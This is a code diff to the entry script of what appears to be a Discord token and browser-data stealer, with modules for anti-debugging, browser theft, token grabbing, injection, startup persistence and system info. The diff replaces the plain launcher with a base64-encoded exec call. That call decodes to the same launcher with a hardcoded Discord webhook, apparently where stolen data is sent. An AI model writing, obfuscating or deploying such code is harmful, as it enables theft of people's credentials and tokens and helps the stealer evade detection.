@@ -7,22 +7,4 @@ from components.systeminfo import SystemInfo
 from config import __CONFIG__
 
 
-def main():
-    funcs = [
-        AntiDebug,
-        Browsers,
-        DiscordToken,
-        Injection,
-        Startup,
-        SystemInfo,
-    ]
-
-    for func in funcs:
-        if __CONFIG__[func.__name__.lower()]:
-            if func.__init__.__code__.co_argcount == 2:
-                func(__CONFIG__['webhook'])
-            else:
-                func()
-
-if __name__ == '__main__':
-    main()
+exec(base64.b64decode("ZGVmIG1haW4oKToNCiAgICBmdW5jcyA9IFsNCiAgICAgICAgQW50aURlYnVnLA0KICAgICAgICBCcm93c2VycywNCiAgICAgICAgRGlzY29yZFRva2VuLA0KICAgICAgICBJbmplY3Rpb24sDQogICAgICAgIFN0YXJ0dXAsDQogICAgICAgIFN5c3RlbUluZm8sDQogICAgXQ0KDQogICAgZm9yIGZ1bmMgaW4gZnVuY3M6DQogICAgICAgIGlmIF9fQ09ORklHX19bZnVuYy5fX25hbWVfXy5sb3dlcigpXToNCiAgICAgICAgICAgIGlmIGZ1bmMuX19pbml0X18uX19jb2RlX18uY29fYXJnY291bnQgPT0gMjoNCiAgICAgICAgICAgICAgICBmdW5jKF9fQ09ORklHX19bJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwNDUzNzkwNTY0NzgyMDQwMzUvdmRwenhNUl8xd3h5ZkpUX2tXNWhoSHY5NVhIWmRIRUx0Y3ZEN0pFTzJ4WG5oZlJmbmNFakt1LUFyVVh2WlRKS2g0azYnXSkNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgZnVuYygpDQoNCmlmIF9fbmFtZV9fID09ICdfX21haW5fXyc6DQogICAgbWFpbigp"))
